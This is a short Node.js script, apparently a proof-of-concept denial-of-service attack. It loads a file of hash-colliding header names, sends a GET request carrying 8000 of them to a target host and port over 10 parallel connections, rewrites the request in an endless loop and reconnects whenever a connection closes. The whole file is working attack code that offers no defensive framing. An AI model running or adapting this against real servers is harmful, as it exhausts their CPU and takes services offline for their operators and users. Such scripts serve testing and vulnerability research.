'use strict';

const PORT = process.argv[2];
const HOST = process.argv[3];
const COLLISIONS_FILE = process.argv[4];

const fs = require('fs');
const net = require('net');
const common = require('./common');

const collisions = fs.readFileSync(COLLISIONS_FILE).toString().split('\n')
    .filter(line => line);

const req = 'GET / HTTP/1.1\r\n' +
            `Host: ${HOST}\r\n` +
            collisions.slice(0, 8000).map(hdr => `${hdr}:.`).join('\r\n') +
            '\r\n\r\n';

function shoot() {
  const s = net.connect(PORT, HOST, () => {
    function fire() {
      s.write(req, fire);
    }
    fire();
  });

  s.on('error', () => {
    s.destroy();
  });
  s.once('close', () => shoot());
  s.resume();
}

for (let i = 0; i < 10; i++)
  shoot();
